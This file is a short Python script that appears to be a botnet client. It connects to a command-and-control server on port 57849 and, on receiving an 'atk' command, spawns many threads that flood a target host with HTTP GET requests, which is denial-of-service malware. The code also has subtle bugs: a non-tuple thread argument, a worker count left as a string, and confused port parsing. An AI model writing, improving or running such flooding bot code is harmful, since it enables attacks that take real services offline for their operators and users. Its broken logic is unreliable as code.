import socket
import threading
import requests

ADDRESS = "" # replace this with your server's IP address
DEFAULT_WORKERS = 100
THREADS = []
is_https = False

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ADDRESS, 57849))


def atk(ip, port):
    try:
        r = requests.get(f"http://{ip}" if not is_https else f"https://{ip}")
        print("sent request")
    except:
        print("The port specified does not have a web service running or it is closed.")
        pass

while True and s:
    data = s.recv(128)
    data = data.decode('utf-8').replace("\r\n", "")
    if data.startswith("atk"):
        ip = data.split(" ")[1]
        is_https = True if "https" in ip else False
        port = 80 if len(data.split(" ")) < 2 and not is_https else 80 if is_https and len(data.split(" ")) < 2 else data.split(" ")[1]
        workers = DEFAULT_WORKERS if len(data.split(" ")) < 3 else data.split(" ")[2]
        for i in range(workers + 1):
            t = threading.Thread(target=atk, args=(ip))
            t.start()
            THREADS.append(t)
        for process in THREADS:
            process.join()

    if data.startswith("print"):
        print(data.replace("print ", ""))
